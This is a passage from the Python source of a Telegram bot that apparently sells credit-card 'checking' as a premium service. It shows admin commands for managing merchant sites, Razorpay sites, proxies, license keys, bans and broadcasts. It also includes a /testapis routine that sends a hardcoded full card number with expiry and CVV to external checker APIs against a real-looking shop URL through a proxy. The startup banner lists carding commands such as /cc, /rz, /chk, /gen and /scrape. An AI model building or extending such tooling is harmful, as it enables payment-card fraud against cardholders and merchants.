        await event.reply(premium_emoji("❌ Proxy not found!"))
        return
    
    proxies.remove(proxy)
    write_lines(PROXY_FILE, proxies)
    await event.reply(premium_emoji(f"✅ **Proxy removed!**\n<code>{proxy}</code>"), parse_mode='html')

# ============================================================
# ADMIN COMMANDS - CHECK SITES & PROXIES
# ============================================================

@bot.on(events.NewMessage(pattern='/site'))
async def check_sites(event):
    if not is_admin(event.sender_id):
        return
    
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ No sites to check!"))
        return
    
    status = await event.reply(premium_emoji("🔄 **Checking sites...**"), parse_mode='html')
    
    alive, dead = await fast_site_check(sites)
    
    if alive:
        write_lines(SITES_FILE, alive)
        txt_file = f"working_sites_{int(time.time())}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive))
        await bot.send_message(event.sender_id, f"📄 **{len(alive)} Working Sites**", file=txt_file)
        os.remove(txt_file)
    
    msg = f"""<b>✅ SITE CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Alive:</b> <code>{len(alive)}</code>
<b>❌ Dead:</b> <code>{dead}</code>
<b>📊 Total:</b> <code>{len(sites)}</code>"""
    
    await status.edit(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def check_proxies(event):
    if not is_admin(event.sender_id):
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies to check!"))
        return
    
    status = await event.reply(premium_emoji("🔄 **Checking proxies...**"), parse_mode='html')
    
    alive = []
    dead = []
    total = len(proxies)
    checked = 0
    
    for proxy in proxies:
        result = await check_proxy(proxy)
        if result.get('alive'):
            alive.append(proxy)
        else:
            dead.append(proxy)
        checked += 1
        
        if checked % 5 == 0 or checked == total:
            await status.edit(premium_emoji(f"""💧 Checking...
✅ Working: <code>{len(alive)}</code>
❌ Dead: <code>{len(dead)}</code>
📊 Progress: <code>{checked}/{total}</code>"""), parse_mode="html")
    
    if alive:
        write_lines(PROXY_FILE, alive)
        txt_file = f"working_proxies_{int(time.time())}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive))
        await bot.send_message(event.sender_id, f"📄 **{len(alive)} Working Proxies**", file=txt_file)
        os.remove(txt_file)
    
    msg = f"""<b>✅ PROXY CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Alive:</b> <code>{len(alive)}</code>
<b>❌ Dead:</b> <code>{len(dead)}</code>
<b>📊 Total:</b> <code>{len(proxies)}</code>"""
    
    await status.edit(premium_emoji(msg), parse_mode='html')

# ============================================================
# RAZORPAY SITE MANAGEMENT
# ============================================================

@bot.on(events.NewMessage(pattern='/addrzsites'))
async def add_rz_site(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/addrzsites https://razorpay-site.com</code>"), parse_mode='html')
        return
    
    site = parts[1].strip()
    if not site.startswith("http"):
        site = "https://" + site
    
    sites = load_razorpay_sites()
    if site in sites:
        await event.reply(premium_emoji("⚠️ Site already in RZ list!"))
        return
    
    sites.append(site)
    write_lines(RZ_SITES_FILE, sites)
    await event.reply(premium_emoji(f"✅ **Razorpay site added!**\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmrzsites'))
async def rm_rz_site(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/rmrzsites https://razorpay-site.com</code>"), parse_mode='html')
        return
    
    site = parts[1].strip()
    if not site.startswith("http"):
        site = "https://" + site
    
    sites = load_razorpay_sites()
    if site not in sites:
        await event.reply(premium_emoji("❌ Site not found in RZ list!"))
        return
    
    sites.remove(site)
    write_lines(RZ_SITES_FILE, sites)
    await event.reply(premium_emoji(f"✅ **Razorpay site removed!**\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rzsites'))
async def list_rz_sites(event):
    if not is_admin(event.sender_id):
        return
    
    sites = load_razorpay_sites()
    if not sites:
        await event.reply(premium_emoji("❌ No Razorpay sites found!"))
        return
    
    text = "\n".join([f"{i+1}. {s[:60]}" for i, s in enumerate(sites[:20])])
    msg = f"""<b>💎 RAZORPAY SITES</b>
━━━━━━━━━━━━━━━━━━━━
<b>Total:</b> <code>{len(sites)}</code>
━━━━━━━━━━━━━━━━━━━━
{text}"""
    
    if len(sites) > 20:
        msg += f"\n\n... and {len(sites) - 20} more"
    
    await event.reply(premium_emoji(msg), parse_mode='html')

# ============================================================
# ADMIN PANEL
# ============================================================

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_panel(event):
    if not is_admin(event.sender_id):
        return
    
    users = len(get_all_users())
    sites = len(load_sites())
    proxies = len(load_proxies())
    premium = len(read_lines(PREMIUM_FILE))
    banned = len(read_lines(BANNED_FILE))
    keys = len(read_lines(KEYS_FILE))
    multi_keys = len(load_keys())
    
    msg = f"""<b>👑 ADMIN PANEL</b>
━━━━━━━━━━━━━━━━━━━━
<b>👥 Users:</b> <code>{users}</code>
<b>🌐 Sites:</b> <code>{sites}</code>
<b>📡 Proxies:</b> <code>{proxies}</code>
<b>💎 Premium:</b> <code>{premium}</code>
<b>🚫 Banned:</b> <code>{banned}</code>
<b>🔑 Keys:</b> <code>{keys}</code>
<b>🔐 Multi-Keys:</b> <code>{multi_keys}</code>"""
    
    buttons = [
        [Button.inline("📊 STATS", b"astats"), Button.inline("👥 USERS", b"ausers")],
        [Button.inline("🔑 KEYS", b"akeys"), Button.inline("📢 NOTICE", b"anotice")],
        [Button.inline("🌐 SITES", b"asites"), Button.inline("📡 PROXIES", b"aproxies")],
        [Button.inline("🚫 BANNED", b"abanned"), Button.inline("🔙 BACK", b"back")],
    ]
    
    await event.reply(premium_emoji(msg), buttons=buttons, parse_mode='html')

# ============================================================
# ADMIN PANEL BUTTONS
# ============================================================

@bot.on(events.CallbackQuery(data=b"astats"))
async def admin_stats(event):
    if not is_admin(event.sender_id):
        return
    
    users = len(get_all_users())
    sites = len(load_sites())
    proxies = len(load_proxies())
    premium = len(read_lines(PREMIUM_FILE))
    banned = len(read_lines(BANNED_FILE))
    verified = len(read_lines(VERIFIED_FILE))
    keys = len(read_lines(KEYS_FILE))
    multi_keys = len(load_keys())
    
    msg = f"""<b>📊 DETAILED STATS</b>
━━━━━━━━━━━━━━━━━━━━
<b>👥 Total Users:</b> <code>{users}</code>
<b>✅ Verified:</b> <code>{verified}</code>
<b>💎 Premium:</b> <code>{premium}</code>
<b>🆓 Free:</b> <code>{users - premium}</code>
<b>🚫 Banned:</b> <code>{banned}</code>
<b>🌐 Sites:</b> <code>{sites}</code>
<b>📡 Proxies:</b> <code>{proxies}</code>
<b>🔑 Keys:</b> <code>{keys}</code>
<b>🔐 Multi-Keys:</b> <code>{multi_keys}</code>"""
    
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 BACK", b"admin_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"ausers"))
async def admin_users(event):
    if not is_admin(event.sender_id):
        return
    
    users = get_all_users()
    if not users:
        await event.edit(premium_emoji("❌ No users found!"))
        return
    
    text = "\n".join([f"<code>{u}</code>" for u in users[:50]])
    msg = f"""<b>👥 USERS LIST</b>
━━━━━━━━━━━━━━━━━━━━
<b>Total:</b> <code>{len(users)}</code>
━━━━━━━━━━━━━━━━━━━━
{text}"""
    
    if len(users) > 50:
        msg += f"\n\n... and {len(users) - 50} more"
    
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 BACK", b"admin_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"akeys"))
async def admin_keys(event):
    if not is_admin(event.sender_id):
        return
    
    msg = f"""<b>🔑 KEY MANAGEMENT</b>
━━━━━━━━━━━━━━━━━━━━
<code>/key count days</code> - Generate keys
Example: <code>/key 10 30</code> - 10 keys, 30 days

<code>/keystats KEY</code> - Check key stats

<code>/redeem KEY</code> - Redeem key"""
    
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 BACK", b"admin_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"anotice"))
async def admin_notice(event):
    if not is_admin(event.sender_id):
        return
    
    msg = f"""<b>📢 SEND NOTICE</b>
━━━━━━━━━━━━━━━━━━━━
<code>/Notice Your message here</code>
Will be sent to ALL users!"""
    
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 BACK", b"admin_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"asites"))
async def admin_sites_list(event):
    if not is_admin(event.sender_id):
        return
    
    sites = load_sites()
    text = "\n".join([f"{i+1}. {s[:60]}" for i, s in enumerate(sites[:20])])
    msg = f"""<b>🌐 BOT SITES</b>
━━━━━━━━━━━━━━━━━━━━
<b>Total:</b> <code>{len(sites)}</code>
━━━━━━━━━━━━━━━━━━━━
{text}"""
    
    if len(sites) > 20:
        msg += f"\n\n... and {len(sites) - 20} more"
    
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 BACK", b"admin_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"aproxies"))
async def admin_proxies_list(event):
    if not is_admin(event.sender_id):
        return
    
    proxies = load_proxies()
    text = "\n".join([f"{i+1}. {p[:40]}" for i, p in enumerate(proxies[:20])])
    msg = f"""<b>📡 BOT PROXIES</b>
━━━━━━━━━━━━━━━━━━━━
<b>Total:</b> <code>{len(proxies)}</code>
━━━━━━━━━━━━━━━━━━━━
{text}"""
    
    if len(proxies) > 20:
        msg += f"\n\n... and {len(proxies) - 20} more"
    
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 BACK", b"admin_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"abanned"))
async def admin_banned_list(event):
    if not is_admin(event.sender_id):
        return
    
    banned = read_lines(BANNED_FILE)
    if not banned:
        await event.edit(premium_emoji("✅ No banned users!"))
        return
    
    text = "\n".join([f"{i+1}. <code>{u}</code>" for i, u in enumerate(banned[:50])])
    msg = f"""<b>🚫 BANNED USERS</b>
━━━━━━━━━━━━━━━━━━━━
<b>Total:</b> <code>{len(banned)}</code>
━━━━━━━━━━━━━━━━━━━━
{text}"""
    
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 BACK", b"admin_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_back"))
async def admin_back(event):
    await admin_panel(event)

# ============================================================
# ADMIN COMMANDS - BAN/UNBAN/BLOCK
# ============================================================

@bot.on(events.NewMessage(pattern='/ban'))
async def ban_cmd(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/ban user_id</code>"), parse_mode='html')
        return
    
    try:
        target = int(parts[1])
    except:
        await event.reply(premium_emoji("❌ Invalid user ID!"))
        return
    
    if ban_user(target):
        await event.reply(premium_emoji(f"✅ **User banned!**\n<code>{target}</code>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("⚠️ User already banned!"))

@bot.on(events.NewMessage(pattern='/unban'))
async def unban_cmd(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/unban user_id</code>"), parse_mode='html')
        return
    
    try:
        target = int(parts[1])
    except:
        await event.reply(premium_emoji("❌ Invalid user ID!"))
        return
    
    if unban_user(target):
        await event.reply(premium_emoji(f"✅ **User unbanned!**\n<code>{target}</code>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("⚠️ User not banned!"))

@bot.on(events.NewMessage(pattern='/banned'))
async def banned_list(event):
    if not is_admin(event.sender_id):
        return
    
    banned = read_lines(BANNED_FILE)
    if not banned:
        await event.reply(premium_emoji("✅ No banned users!"))
        return
    
    text = "\n".join([f"{i+1}. <code>{u}</code>" for i, u in enumerate(banned)])
    await event.reply(premium_emoji(f"<b>🚫 BANNED USERS</b>\n━━━━━━━━━━━━━━━━━━━━\n{text}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/block'))
async def block_user_cmd(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Only admins can use this command!"))
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/block USER_ID</code>\n\n💡 Example: <code>/block 123456789</code>"), parse_mode='html')
        return
    
    try:
        target_id = int(parts[1])
    except:
        await event.reply(premium_emoji("❌ Invalid user ID!"))
        return
    
    if target_id == user_id:
        await event.reply(premium_emoji("❌ Can't block yourself! 😆"))
        return
    
    if is_admin(target_id):
        await event.reply(premium_emoji("❌ Can't block another admin!"))
        return
    
    if is_blocked(target_id):
        await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> already blocked!"), parse_mode='html')
        return
    
    block_user(target_id)
    
    await event.reply(premium_emoji(f"""<b>🚫 USER BLOCKED SUCCESSFULLY! 🚫</b>
━━━━━━━━━━━━━━━━━━━━
<b>🆔 Blocked ID:</b> <code>{target_id}</code>
<b>👑 Blocked By:</b> <a href="tg://user?id={user_id}">Admin</a>
━━━━━━━━━━━━━━━━━━━━
<b>💡 Unblock:</b> <code>/unblock {target_id}</code>
<b>📋 Blocked List:</b> <code>/blocklist</code>"""), parse_mode='html')

@bot.on(events.NewMessage(pattern='/unblock'))
async def unblock_user_cmd(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Only admins can use this command!"))
        return
    
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/unblock USER_ID</code>"), parse_mode='html')
        return
    
    try:
        target_id = int(parts[1])
    except:
        await event.reply(premium_emoji("❌ Invalid user ID!"))
        return
    
    if not is_blocked(target_id):
        await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not blocked!"), parse_mode='html')
        return
    
    unblock_user(target_id)
    
    await event.reply(premium_emoji(f"""<b>✅ USER UNBLOCKED SUCCESSFULLY! ✅</b>
━━━━━━━━━━━━━━━━━━━━
<b>🆔 Unblocked ID:</b> <code>{target_id}</code>
<b>👑 Unblocked By:</b> <a href="tg://user?id={user_id}">Admin</a>
━━━━━━━━━━━━━━━━━━━━
<b>📋 Blocked List:</b> <code>/blocklist</code>"""), parse_mode='html')

@bot.on(events.NewMessage(pattern='/blocklist'))
async def block_list_cmd(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ Only admins can use this command!"))
        return
    
    blocked = get_blocked_users()
    
    if not blocked:
        await event.reply(premium_emoji("<b>📋 Blocked list is empty!</b>\n\n<b>✅ No users blocked.</b>"), parse_mode='html')
        return
    
    blocked_text = "\n".join([f"<code>{uid}</code>" for uid in blocked])
    
    msg = f"""<b>🚫 BLOCKED USERS LIST 🚫</b>
━━━━━━━━━━━━━━━━━━━━
<b>📊 Total Blocked:</b> {len(blocked)}

{blocked_text}
━━━━━━━━━━━━━━━━━━━━
<b>🔓 Unblock:</b> <code>/unblock USER_ID</code>"""
    
    await event.reply(premium_emoji(msg), parse_mode="html")

# ============================================================
# ADMIN COMMANDS - KEY GENERATION & NOTICE
# ============================================================

@bot.on(events.NewMessage(pattern='/key'))
async def gen_key_cmd(event):
    if not is_admin(event.sender_id):
        return
    
    parts = event.message.text.split()
    if len(parts) < 3:
        await event.reply(premium_emoji("Usage: <code>/key count days</code>\nExample: <code>/key 10 30</code>"), parse_mode='html')
        return
    
    try:
        count = int(parts[1])
        days = int(parts[2])
    except:
        await event.reply(premium_emoji("❌ Invalid numbers!"))
        return
    
    keys = []
    for _ in range(count):
        key = f"PRIMEXNEXUS-{random.randint(100000,999999)}-{days}D"
        keys.append(key)
        write_lines(KEYS_FILE, read_lines(KEYS_FILE) + [f"{key}|{days}"])
    
    text = "\n".join([f"{i+1}. <code>{k}</code>" for i, k in enumerate(keys)])
    await event.reply(premium_emoji(f"<b>🔑 KEYS GENERATED</b>\n━━━━━━━━━━━━━━━━━━━━\n{text}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/Notice'))
async def notice_cmd(event):
    if not is_admin(event.sender_id):
        return
    
    text = event.message.text.replace('/Notice', '').strip()
    if not text:
        await event.reply(premium_emoji("❌ Please provide a message!"))
        return
    
    users = get_all_users()
    if not users:
        await event.reply(premium_emoji("❌ No users found!"))
        return
    
    status = await event.reply(premium_emoji(f"📤 Sending notice to {len(users)} users..."), parse_mode='html')
    
    msg = f"""<b>📢 NOTICE FROM ADMIN</b>
━━━━━━━━━━━━━━━━━━━━
{text}"""
    
    sent = 0
    failed = 0
    
    for user_id in users:
        try:
            await bot.send_message(user_id, premium_emoji(msg), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    await status.edit(premium_emoji(f"""<b>✅ NOTICE SENT</b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Sent:</b> <code>{sent}</code>
<b>❌ Failed:</b> <code>{failed}</code>
<b>👥 Total:</b> <code>{len(users)}</code>"""), parse_mode='html')

@bot.on(events.NewMessage(pattern='/Note'))
async def note_cmd(event):
    """Alias for /Notice"""
    await notice_cmd(event)

# ============================================================
# ADMIN COMMANDS - OTHER
# ============================================================

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if not is_admin(event.sender_id):
        return
    
    users = len(get_all_users())
    sites = len(load_sites())
    proxies = len(load_proxies())
    premium = len(read_lines(PREMIUM_FILE))
    banned = len(read_lines(BANNED_FILE))
    verified = len(read_lines(VERIFIED_FILE))
    keys = len(read_lines(KEYS_FILE))
    multi_keys = len(load_keys())
    
    msg = f"""<b>📊 BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━
<b>👥 Users:</b> <code>{users}</code>
<b>✅ Verified:</b> <code>{verified}</code>
<b>💎 Premium:</b> <code>{premium}</code>
<b>🚫 Banned:</b> <code>{banned}</code>
<b>🌐 Sites:</b> <code>{sites}</code>
<b>📡 Proxies:</b> <code>{proxies}</code>
<b>🔑 Keys:</b> <code>{keys}</code>
<b>🔐 Multi-Keys:</b> <code>{multi_keys}</code>"""
    
    await event.reply(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/users'))
async def users_cmd(event):
    if not is_admin(event.sender_id):
        return
    
    users = get_all_users()
    if not users:
        await event.reply(premium_emoji("❌ No users found!"))
        return
    
    filename = f"users_{int(time.time())}.txt"
    with open(filename, 'w') as f:
        f.write('\n'.join([str(u) for u in users]))
    
    await event.reply(premium_emoji(f"📄 **{len(users)} Users**"), file=filename, parse_mode='html')
    os.remove(filename)

@bot.on(events.NewMessage(pattern='/checkapi'))
async def check_api(event):
    if not is_admin(event.sender_id):
        return
    
    status = await event.reply(premium_emoji("⚡ **Checking APIs...**"), parse_mode='html')
    
    results = []
    working = 0
    
    for name, url in API_MAP.items():
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{url}?site=https://test.com&cc=test&proxy=test", timeout=5) as resp:
                    if resp.status == 200:
                        results.append(f"✅ {name} → WORKING")
                        working += 1
                    else:
                        results.append(f"❌ {name} → DEAD")
        except:
            results.append(f"❌ {name} → DEAD")
    
    msg = f"""<b>⚡ API STATUS</b>
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(results)}
━━━━━━━━━━━━━━━━━━━━
<b>✅ Working:</b> <code>{working}/{len(API_MAP)}</code>"""
    
    await status.edit(premium_emoji(msg), parse_mode='html')

@bot.on(events.NewMessage(pattern='/testapis'))
async def test_all_apis(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return
    
    status_msg = await event.reply(premium_emoji("⏳ **Testing all APIs...**"))
    
    test_card = "4061730206041873|11|2026|387"
    test_site = "https://paperieplanning.com"
    test_proxy = "127.0.0.1:8080"
    
    results = []
    working = 0
    dead = 0
    
    for i, (name, api_url) in enumerate(API_MAP.items(), 1):
        try:
            url = f"{api_url}?site={test_site}&cc={test_card}&proxy={test_proxy}"
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        try:
                            data = await resp.json()
                            if data.get("Status") == True or data.get("status") == True:
                                results.append(f"✅ **API {i}** → 🟢 WORKING")
                                working += 1
                            else:
                                results.append(f"⚠️ **API {i}** → 🟡 RESPONDING BUT MAYBE DEAD")
                                dead += 1
                        except:
                            results.append(f"✅ **API {i}** → 🟢 WORKING (JSON OK)")
                            working += 1
                    else:
                        results.append(f"❌ **API {i}** → 🔴 DEAD (Status: {resp.status})")
                        dead += 1
        except Exception as e:
            results.append(f"❌ **API {i}** → 🔴 DEAD ({str(e)[:30]})")
            dead += 1
    
    final_msg = f"""<b>⚡ API STATUS CHECK ⚡</b>
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(results)}
━━━━━━━━━━━━━━━━━━━━
<b>📊 SUMMARY</b>
✅ Working: <code>{working}</code>
❌ Dead: <code>{dead}</code>
⏳ Time: <code>{get_time()}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot By: <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a></b>"""
    
    await status_msg.edit(premium_emoji(final_msg), parse_mode="html")

# ============================================================
# AUTO-BAN FOR GENERATED FILES
# ============================================================

@bot.on(events.NewMessage)
async def auto_ban_gen_files(event):
    user_id = event.sender_id
    
    if is_admin(user_id):
        return
    
    if event.file and event.file.name and event.file.name.endswith('.txt'):
        try:
            file_path = await event.download_media()
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            os.remove(file_path)
            
            cards = extract_cc(content)
            if cards:
                ban_user(user_id)
                await bot.send_message(OWNER_ID, f"🚫 **Auto-Banned User**\nID: {user_id}\nReason: Sent CC file with {len(cards)} cards")
                await event.reply(premium_emoji(f"🚫 **You have been BANNED!**\nContact {OWNER_NAME}"))
        except:
            pass

# ============================================================
# FEEDBACK
# ============================================================

@bot.on(events.NewMessage(pattern='/feedback'))
async def handle_feedback(event):
    user_id = event.sender_id
    text = event.message.text.replace('/feedback', '').strip()
    
    if not text and not event.message.photo and not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please provide feedback!"))
        return
    
    msg = f"""<b>📝 NEW FEEDBACK</b>
━━━━━━━━━━━━━━━━━━━━
<b>👤 User:</b> <a href='tg://user?id={user_id}'>User</a>
<b>🆔 ID:</b> <code>{user_id}</code>
<b>📝 Message:</b> {text or 'No text'}"""
    
    try:
        await bot.send_message(OWNER_ID, premium_emoji(msg), parse_mode='html')
        await event.reply(premium_emoji("✅ **Feedback sent!**\nThank you for your feedback!"), parse_mode='html')
    except:
        await event.reply(premium_emoji("❌ Error sending feedback!"))

# ============================================================
# AUTO FILE DETECTION
# ============================================================

@bot.on(events.NewMessage)
async def auto_detect_file(event):
    user_id = event.sender_id
    
    if event.out or is_banned(user_id):
        return
    
    if not event.file or not event.file.name.endswith('.txt'):
        return
    
    if not is_auto_detect_enabled():
        return
    
    if not is_admin(user_id) and not is_premium(user_id):
        await event.reply(premium_emoji(f"""<b>🔒 PREMIUM REQUIRED</b>
━━━━━━━━━━━━━━━━━━━━
Bulk check is for premium users only!
Contact {OWNER_NAME}"""), parse_mode='html')
        return
    
    await process_file(event, user_id, event)

def is_auto_detect_enabled():
    config = load_config()
    return config.get('auto_detect_files', True)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"auto_detect_files": True}
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)


# ============================================================
# MAIN LOOP
# ============================================================

if __name__ == "__main__":
    init_db()
    print(f"🌟 {BOT_NAME}")
    print(f"⚡ {BOT_TAGLINE}")
    print(f"👑 Owner: {OWNER_NAME} (ID: {OWNER_ID})")
    print("🔥 Bot Started!")
    print("📋 ALL COMMANDS LOADED:")
    print("")
    print("🚀 MAIN COMMANDS:")
    print("  /start, /plan, /redeem")
    print("")
    print("💳 CC CHECKING:")
    print("  /cc, /rz, /chk, /rzchk")
    print("")
    print("🛠️ USER SITE MANAGEMENT:")
    print("  /addsite, /addsites, /rmsite, /rmsites, /mysites, /clearsites")
    print("")
    print("📡 USER PROXY MANAGEMENT:")
    print("  /addproxy, /rmproxy, /rmmyproxy, /myproxies, /getproxy, /clearproxies")
    print("  /rmproxyindex, /clearproxy, /savetxt, /chkproxy")
    print("")
    print("👑 ADMIN COMMANDS:")
    print("  /admin, /addst, /rmst, /addpx, /rmpx, /site, /proxy")
    print("  /addrzsites, /rmrzsites, /rzsites")
    print("  /key, /keystats, /Notice, /Note, /stats, /users")
    print("  /ban, /unban, /banned, /block, /unblock, /blocklist")
    print("  /checkapi, /testapis")
    print("")
    print("🔧 PREMIUM TOOLS:")
    print("  /gen, /scrape, /split")
    print("")
    print("📝 OTHER:")
    print("  /feedback")
    print("")
    print("🎯 TOTAL COMMANDS: 48")
    print("━━━━━━━━━━━━━━━━━━━━")
    
    try:
        bot.run_until_disconnected()
    except KeyboardInterrupt:
        print("🛑 Stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}") 